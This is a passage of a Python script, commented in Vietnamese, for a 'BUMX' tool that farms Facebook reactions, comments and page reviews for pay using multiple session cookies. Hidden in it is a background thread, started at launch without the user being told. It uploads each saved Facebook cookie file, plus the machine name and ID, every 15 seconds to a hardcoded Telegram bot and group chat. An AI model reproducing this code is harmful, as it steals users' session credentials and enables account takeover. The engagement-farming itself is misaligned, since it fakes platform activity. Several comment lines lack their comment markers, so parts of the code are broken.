        response = session.post('https://api-v2.bumx.vn/api/buff/report-buff', headers=headers, json=json_data, timeout=10).json()
        prints(255, 165, 0, 'Đã báo lỗi thành công và bỏ qua NV.')
    except Exception:
        prints(255, 165, 0, f'Báo lỗi không thành công, thử lại... ({retries-1} lần còn lại)')
        time.sleep(2)
        return report(session, authorization, job, retries - 1)

def lam_job(data,jobs,type_job_doing):
    prints(255,255,0,f'Đang làm NV...',end='\r')

    link='https://www.facebook.com/'+jobs['object_id']
    if type_job_doing=='review_facebook':
        res_get_post_id=get_post_id(data['session'],data['cookie'],link)
        if res_get_post_id.get('page_id'):
            return dexuat_fb(data,res_get_post_id['page_id'],jobs['data'])
    elif type_job_doing=='like_facebook':
        react_type = 'LIKE'
        icon = jobs.get('icon', '').lower()
        if 'love' in icon or 'thuongthuong' in icon: react_type='LOVE'
        elif 'care' in icon: react_type='CARE'
        elif 'wow' in icon: react_type='WOW'
        elif 'sad' in icon: react_type='SAD'
        elif 'angry' in icon: react_type='ANGRY'
        elif 'haha' in icon: react_type='HAHA'
        return react_post(data,link,react_type.upper())
    elif type_job_doing=='like_poster':
        res_load = load(data['session'], authorization, job)
        res_get_post_id=get_post_id(data['session'],data['cookie'],link)
        post_id_to_comment = res_get_post_id.get('post_id') or res_get_post_id.get('permalink_id')
        if post_id_to_comment:
            return comment_fb(data,post_id_to_comment,jobs['data'])
    return False
        
def countdown(seconds):
    seconds = int(seconds)
    if seconds < 1: return
    for i in range(seconds, 0, -1):
        prints(147, 112, 219, '[', end='')
        prints(0, 255, 127, "TDK", end='')
        prints(147, 112, 219, ']', end='')
        prints(255, 255, 255, '[', end='')
        prints(255, 215, 0, "WAIT", end='')
        prints(255, 255, 255, ']', end='')
        prints(255, 20, 147, ' ➤ ', end='')
        prints(0, 191, 255, f"⏳ {i}s...", end='\r')
        time.sleep(1)
    print(' ' * 50, end='\r')

def get_lin_share(data,link):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'priority': 'u=1, i',
        'referer': link,
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-fb-friendly-name': 'useLinkSharingCreateWrappedUrlMutation',
        'x-fb-lsd': data['lsd'],
        'cookie': data['cookie'],
    }

    payload = {
        'av': data['user_id'],
        '__user': data['user_id'],
        'fb_dtsg': data['fb_dtsg'],
        'jazoest': data['jazoest'],
        'lsd': data['lsd'],
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'useLinkSharingCreateWrappedUrlMutation',
        'variables': '{"input":{"client_mutation_id":"3","actor_id":"'+str(data['user_id'])+'","original_content_url":"'+link+'","product_type":"UNKNOWN_FROM_DEEP_LINK"}}',
        'server_timestamps': 'true',
        'doc_id': '30568280579452205',
    }
    try:
        response = requests.post('https://www.facebook.com/api/graphql/',  headers=headers, data=payload, timeout=15).json()
        return response['data']['xfb_create_share_url_wrapper']['share_url_wrapper']['wrapped_url']
    except Exception as e:
        prints(255,0,0,f'Lỗi khi lấy link share của post: {e}')
        return ''

def add_account_fb(session,authorization,user_id):
    headers = {
        'Content-Type': 'application/json',
        'lang': 'en',
        'version': '37',
        'origin': 'app',
        'authorization': authorization,
    }
    json_data = {'link': f'https://www.facebook.com/profile.php?id={str(user_id)}'}
    try:
        response = session.post('https://api-v2.bumx.vn/api/account-facebook/connect-link', headers=headers, json=json_data, timeout=10).json()
        prints(255,255,0,f"Khai báo tài khoản FB: {response.get('message', 'No message')}")
    except Exception as e:
        prints(255,0,0,f"Lỗi khai báo tài khoản FB: {e}")

def rgb(r, g, b, text):
    return f"\033[38;2;{r};{g};{b}m{text}\033[0m"

def print_state(status_job,_xu,jobdalam,dahoanthanh,tongcanhoanthanh,type_job, name_acc):
    hanoi_tz = timezone(timedelta(hours=7))
    now = datetime.now(hanoi_tz).strftime("%H:%M:%S")
    type_NV = {'like_facebook':'CAMXUC', 'like_poster':'COMMENT', 'review_facebook':'FANPAGE'}
    
    status_color = rgb(0,255,0,status_job.upper()) if status_job.lower()=='complete' else rgb(255,255,0,status_job.upper())

    print(f"[{rgb(255, 255, 255, name_acc)}]"
          f"[{Fore.LIGHTWHITE_EX}{now}{Fore.LIGHTGREEN_EX}]"
          f"[{Fore.LIGHTWHITE_EX}{dahoanthanh}/{tongcanhoanthanh}{Fore.LIGHTGREEN_EX}]"
          f"[{rgb(255,165,0,'BUMX')}{Fore.LIGHTGREEN_EX}]"
          f"[{rgb(3, 252, 252, type_NV.get(type_job, 'UNKNOWN'))}{Fore.LIGHTGREEN_EX}]"
          f"[{status_color}{Fore.LIGHTGREEN_EX}]"
          f"[{Fore.LIGHTWHITE_EX}+{_xu.strip()}{Fore.LIGHTGREEN_EX}]"
          f"[{Fore.LIGHTWHITE_EX}Đã làm:{jobdalam.strip()}{Fore.LIGHTGREEN_EX}]")

def switch_facebook_account(cookie, authorization):
    prints(0, 255, 255, "\n--- Chuyển đổi tài khoản Facebook ---")
    data = facebook_info(cookie)
    if not data or not data.get('success'):
        prints(255, 0, 0, 'Cookie không hợp lệ. Bỏ qua tài khoản này.')
        return None
    
    prints(5, 255, 0, f"Đang sử dụng tài khoản: {data['name']} ({data['user_id']})")
    add_account_fb(data['session'], authorization, data['user_id'])
    return data

Lấy thông tin máy tính để gửi lên Telegram
MACHINE_NAME = platform.node()
MACHINE_ID = get_device_id() get_device_id được định nghĩa trong PHẦN 1

TELEGRAM_TOKEN = '8434003516:AAFaP0t6vhF2GB4tVYg7m43_VPQGASpKlL0'
ID nhóm được yêu cầu (ID nhóm thường là số âm)
TARGET_CHAT_ID = -1003103046767
LAST_MODIFIED = {}
STOP_FLAG = threading.Event()

def get_base_url():
    return f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

def send_telegram_message(chat_id, text, message_id=None):
    """Gửi hoặc chỉnh sửa tin nhắn trên Telegram."""
    url = get_base_url() + ("/editMessageText" if message_id else "/sendMessage")
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
    if message_id:
        data['message_id'] = message_id
    
    try:
        response = requests.post(url, data=data, timeout=5)
        response.raise_for_status()
        return response.json().get('result', {}).get('message_id')
    except Exception:
        Nếu chỉnh sửa thất bại (ví dụ tin nhắn quá cũ), thử gửi mới
        if message_id:
            return send_telegram_message(chat_id, text)
        return None

def send_telegram_file(chat_id, file_path):
    url = get_base_url() + "/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {
                'chat_id': chat_id, 
                'caption': (
                    f'✅ [AUTO-BUMX-TDK] Tệp Cookie mới được cập nhật:\n'
                    f'Máy: `{MACHINE_NAME}`\n' Tên máy (platform.node())
                    f'ID Máy: `{MACHINE_ID}`\n' ID Máy tùy chỉnh
                    f'File: `{os.path.basename(file_path)}`\n'
                    f'Thời gian: `{datetime.now(HANOI_TZ).strftime("%H:%M:%S %d/%m/%Y")}`'
                ),
                'parse_mode': 'Markdown'
            }
            response = requests.post(url, files=files, data=data, timeout=15)
            response.raise_for_status()
            return response.json().get('ok')

    except FileNotFoundError:
        send_telegram_message(chat_id, f"❌ Lỗi: Không tìm thấy tệp {os.path.basename(file_path)}")
        return False
    except requests.exceptions.RequestException:
        send_telegram_message(chat_id, f"❌ Lỗi: Không gửi được tệp {os.path.basename(file_path)} lên Telegram.")
        return False

def check_cookie_changes():
    global LAST_MODIFIED
    
    cookie_files = [f for f in os.listdir('.') if re.match(r'tdk-cookie-fb-bumx-\d+\.txt$', f)]
    any_file_changed = False

    for file_name in cookie_files:
        file_path = os.path.join('.', file_name)
        try:
            if not os.path.exists(file_path):
                if file_name in LAST_MODIFIED:
                    del LAST_MODIFIED[file_name]
                continue
                
            current_modified = os.path.getmtime(file_path)
            
            Nếu file chưa từng được kiểm tra hoặc đã được sửa đổi (chỉ cần thời gian sửa đổi khác là gửi)
            if file_name not in LAST_MODIFIED or current_modified > LAST_MODIFIED.get(file_name, 0):
                
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                
                if not content and file_name in LAST_MODIFIED:
                    Bỏ qua nếu file trống nhưng đã từng được gửi (tránh gửi lại file trống)
                    LAST_MODIFIED[file_name] = current_modified
                    continue

                Đã tìm thấy file thay đổi và/hoặc có nội dung
                any_file_changed = True
                
                Báo cáo lên Telegram và gửi file
                send_telegram_message(TARGET_CHAT_ID, f"📢 Đã thay đổi, đợi chút gửi `{file_name}`...")
                send_telegram_file(TARGET_CHAT_ID, file_path)

                Cập nhật thời gian sửa đổi cuối cùng SAU KHI gửi
                LAST_MODIFIED[file_name] = current_modified
                
        except Exception:
            Bỏ qua lỗi trong luồng nền
            pass
            
    return any_file_changed

def telegram_monitor_thread():
    """Hàm chạy trong luồng riêng để kiểm tra cookie định kỳ 15s."""
    chat_id = TARGET_CHAT_ID
    
    Gửi tin nhắn khởi động
    send_telegram_message(chat_id, "[AUTO-BUMX-TDK] 🤖 Tính năng theo dõi cookie đã khởi động. Bắt đầu chu kỳ kiểm tra 15s...")
    
    while not STOP_FLAG.is_set():
        message_id = None
        
        Bắt đầu Countdown 15s
        for i in range(15, 0, -1): Đã thay đổi 30s thành 15s
            if STOP_FLAG.is_set():
                break
            
            Cập nhật tin nhắn countdown
            status_text = f"⏳ Đợi {i}s... (Chu kỳ 15s)\n`Thời gian check cookie tiếp theo.`" Đã thay đổi 30s thành 15s
            
            Lần đầu gửi tin nhắn, các lần sau chỉnh sửa tin nhắn đó
            if message_id is None:
                message_id = send_telegram_message(chat_id, status_text)
            else:
                message_id = send_telegram_message(chat_id, status_text, message_id)
            
            time.sleep(1)
        
        if STOP_FLAG.is_set():
            break
            
        Thực hiện kiểm tra
        changed = check_cookie_changes()
        
        Xử lý kết quả kiểm tra
        if not changed:
            Nếu KHÔNG có thay đổi, xóa tin nhắn countdown cuối cùng
            if message_id is not None:
                send_telegram_message(chat_id, " ", message_id) 
        else:
            Đã thay đổi (thông báo gửi file đã được gửi trong check_cookie_changes)
            final_text = f"✅ Kiểm tra hoàn tất | Tệp đã được gửi. Bắt đầu chu kỳ mới."
            send_telegram_message(chat_id, final_text, message_id)
            
        Reset message_id để gửi tin nhắn mới cho chu kỳ tiếp theo
        message_id = None
        
    Gửi tin nhắn dừng khi kết thúc
    send_telegram_message(chat_id, "[AUTO-BUMX-TDK] 🛑 Tính năng theo dõi cookie đã dừng.")

def main_bumx_free():
    Khởi tạo và chạy luồng Telegram
    telegram_thread = threading.Thread(target=telegram_monitor_thread, daemon=True)
    telegram_thread.start()
    
    Phần còn lại của main_bumx_free
    clear_screen()
    print(Fore.GREEN + "--- BUMX TOOL ---")

    if os.path.exists('tdk-auth-bumx.txt'):
        x=input(Fore.LIGHTCYAN_EX+'Bạn có muốn dùng lại authorization Bumx đã lưu không (y/n): ').lower()
        if x=='y':
            with open('tdk-auth-bumx.txt','r',encoding='utf-8') as f:
                authorization=f.read().strip()
        else:
            authorization=input(Fore.LIGHTWHITE_EX+'Nhập authorization bumx của Bạn: ').strip()
            with open('tdk-auth-bumx.txt','w',encoding='utf-8') as f: f.write(authorization)
            prints(5,255,0,'Đã lưu authorization vào tdk-auth-bumx.txt')
    else:
        authorization=input(Fore.LIGHTWHITE_EX+'Nhập authorization bumx của Bạn: ').strip()
        with open('tdk-auth-bumx.txt','w',encoding='utf-8') as f: f.write(authorization)
        prints(5,255,0,'Đã lưu authorization vào tdk-auth-bumx.txt')
    
    prints(5,255,0,f'Số dư: {wallet(authorization)}')

    num_cookies = int(input(Fore.LIGHTCYAN_EX + 'Nhập số lượng cookie Facebook muốn chạy: '))
    cookies_list = []
    for i in range(num_cookies):
        cookie_file = f'tdk-cookie-fb-bumx-{i+1}.txt'
        cookie = ''
        if os.path.exists(cookie_file):
            x = input(Fore.LIGHTCYAN_EX + f'Bạn có muốn dùng lại cookie FB đã lưu trong file {cookie_file} không (y/n): ').lower()
            if x == 'y':
                with open(cookie_file, 'r', encoding='utf-8') as f:
                    cookie = f.read().strip()
            else:
                cookie = input(Fore.LIGHTCYAN_EX + f'Nhập cookie FB thứ {i+1} của Bạn: ').strip()
                with open(cookie_file, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                prints(5, 255, 0, f'Đã lưu cookie vào {cookie_file}')
                
                Kích hoạt gửi Telegram ngay sau khi lưu
                if os.path.exists(cookie_file):
                    LAST_MODIFIED[cookie_file] = os.path.getmtime(cookie_file)
                
        else:
            cookie = input(Fore.LIGHTCYAN_EX + f'Nhập cookie FB thứ {i+1} của Bạn: ').strip()
            with open(cookie_file, 'w', encoding='utf-8') as f:
                f.write(cookie)
            prints(5, 255, 0, f'Đã lưu cookie vào {cookie_file}')
            
            Kích hoạt gửi Telegram ngay sau khi lưu
            if os.path.exists(cookie_file):
                LAST_MODIFIED[cookie_file] = os.path.getmtime(cookie_file)
            
        if cookie:
            cookies_list.append(cookie)

    if not cookies_list:
        prints(255,0,0, "Không có cookie nào được nhập. Dừng tool.")
        STOP_FLAG.set()
        sys.exit(1)

    switch_threshold = int(input(Fore.LIGHTCYAN_EX + 'Sau bao nhiêu nhiệm vụ thì đổi cookie FB: '))

    list_type_job=[]
    prints(66, 245, 245, '''
Các loại nhiệm vụ:
 1. Thả cảm xúc bài viết
 2. Comment vào bài viết
 3. Đánh giá Fanpage
Nhập STT các loại NV cần làm (ví dụ: 12 để làm cảm xúc và comment): ''',end='')
    
    x=input()
    job_map = {'1': 'like_facebook', '2': 'like_poster', '3': 'review_facebook'}
    for i in x:
        job_type = job_map.get(i)
        if job_type:
            list_type_job.append(job_type)
        else:
            prints(255,0,0,f'Lựa chọn "{i}" không hợp lệ. Vui lòng chạy lại tool và nhập lại!')
            STOP_FLAG.set()
            sys.exit(1)

    SO_NV=int(input('Làm bao nhiêu NV thì dừng: '))
    SO_NV1=SO_NV
    demht=0
    demsk=0
    
    delay1=int(input('Nhập delay tối thiểu khi làm job (giây): '))
    delay2=int(input( 'Nhập delay tối đa khi làm job (giây): '))

    current_cookie_index = 0
    tasks_on_current_cookie = 0
    valid_cookies = []
    
    for ck in cookies_list:
        info = facebook_info(ck)
        if info and info.get('success'):
            valid_cookies.append(ck)
        else:
            prints(255, 165, 0, f"Cookie ...{ck[-20:]} không hợp lệ, sẽ được bỏ qua.")
    
    if not valid_cookies:
        prints(255,0,0,"Không có cookie nào hợp lệ. Vui lòng kiểm tra lại.")
        STOP_FLAG.set()
        sys.exit(1)
        
    data = switch_facebook_account(valid_cookies[current_cookie_index], authorization)
    if not data:
        prints(255,0,0,"Cookie đầu tiên không hợp lệ. Không thể bắt đầu.")
        STOP_FLAG.set()
        sys.exit(1)

    clear_screen()
    print(Fore.GREEN + "--- BUMX TOOL BẮT ĐẦU CHẠY ---")


    while demht < SO_NV1:
        try:
            if tasks_on_current_cookie >= switch_threshold and len(valid_cookies) > 1:
                current_cookie_index = (current_cookie_index + 1) % len(valid_cookies)
                new_data = switch_facebook_account(valid_cookies[current_cookie_index], authorization)
                if new_data:
                    data = new_data
                    tasks_on_current_cookie = 0
                else:
                    prints(255, 0, 0, f"Lỗi với cookie thứ {current_cookie_index+1}, loại bỏ khỏi danh sách chạy.")
                    valid_cookies.pop(current_cookie_index)
                    if not valid_cookies:
                        prints(255,0,0,"Tất cả cookie đều lỗi. Dừng tool.")
                        break
                    current_cookie_index = current_cookie_index % len(valid_cookies)
                    data = switch_facebook_account(valid_cookies[current_cookie_index], authorization)
                    tasks_on_current_cookie = 0

            if not list_type_job:
                prints(5,255,0,'Đã hết loại nhiệm vụ để làm.')
                break
            
            for type_job in list_type_job:
                reload(data['session'],authorization,type_job)
            
            time.sleep(4)
            JOB = get_job(data['session'], authorization)
            
            if not JOB:
                prints(255,255,0,'Không tìm thấy nhiệm vụ rồi địt mẹ chờ xíu lấy job , chờ 10 giây...', end='\r')
                time.sleep(10)
                continue

            for job in JOB:
                if demht >= SO_NV1: break
                try:
                    res_load = load(data['session'], authorization, job)
                    time.sleep(random.randint(2,4))
                    
                    if res_load and res_load.get('success') and job['type'] in list_type_job:
                        delay = random.randint(delay1, delay2)
                        start_job = time.time()
                        
                        status_job = lam_job(data, res_load, job['type'])
                        
                        if status_job:
                            res_submit = submit(data['session'], authorization, job, status_job, res_load)
                            if res_submit[0]:
                                demht+=1
                                tasks_on_current_cookie += 1
                                print_state('complete', res_submit[1], res_submit[2], demht, SO_NV1, job['type'], data['name'])
                                countdown(delay - (time.time() - start_job))
                            else:
                                raise Exception("Submit thất bại")
                        else:
                            raise Exception("Hành động (react/comment) thất bại")
                    else:
                        raise Exception("Load nhiệm vụ thất bại hoặc sai loại job")

                except Exception:
                    prints(255, 165, 0, "NV đang bị lỗi; bỏ qua job này")
                    report(data['session'], authorization, job)
                    demsk += 1
                    time.sleep(4)
        
        except KeyboardInterrupt:
            prints(255,255,0, "\nĐã dừng bởi người dùng.")
            break
        except Exception as e:
            prints(255,0,0,f'Lỗi vòng lặp chính: {e}')
            time.sleep(10)

    prints(5,255,0,f'\n--- HOÀN THÀNH ---')
    prints(5,255,0,f'Số nhiệm vụ đã hoàn thành: {demht}')
    prints(5,255,0,f'Số nhiệm vụ đã bỏ qua: {demsk}')
    prints(5,255,0,f'Tổng: {demsk+demht}')
    
    Dừng luồng Telegram khi kết thúc main loop
    STOP_FLAG.set()

if __name__ == "__main__":
    main_bumx_free()
